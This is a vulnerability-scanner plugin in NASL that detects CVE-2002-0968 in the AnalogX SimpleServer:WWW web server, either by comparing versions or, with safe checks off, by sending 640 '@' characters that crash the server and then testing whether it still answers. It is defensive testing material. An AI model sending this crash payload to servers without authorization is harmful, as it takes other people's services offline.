# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11035");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5006");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-0968");
  script_name("AnalogX SimpleServer:WWW DoS");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("gb_simpleserver_www_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("analogx/simpleserver_www/detected");

  script_tag(name:"solution", value:"Upgrade your software or use another HTTP server.");

  script_tag(name:"summary", value:"It was possible to kill the remote web server by sending 640 @
  character to it.");

  script_tag(name:"impact", value:"An attacker may use this flaw to make your server crash continuously,
  preventing it from working properly.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

CPE = "cpe:/a:analogx:simpleserver_www";

include("host_details.inc");
include("version_func.inc");
include("http_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(safe_checks()) {
  if(!infos = get_app_version_and_location(cpe:CPE, port:port, exit_no_version:TRUE)) exit(0);
  version = infos["version"];
  location = infos["location"];
  if(version_is_less_equal(version:version, test_version:"1.16")) {
    report = report_fixed_ver(installed_version:version, fixed_version:"1.23", install_path:location);
    security_message(data:report, port:port);
    exit(0);
  }
  exit(99);
}

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

send(socket:soc, data:string(crap(length:640, data:"@"), "\r\n\r\n"));
http_recv(socket:soc);
close(soc);

soc = open_sock_tcp(port);
if(soc){
  close(soc);
  exit(0);
}

security_message(port:port);
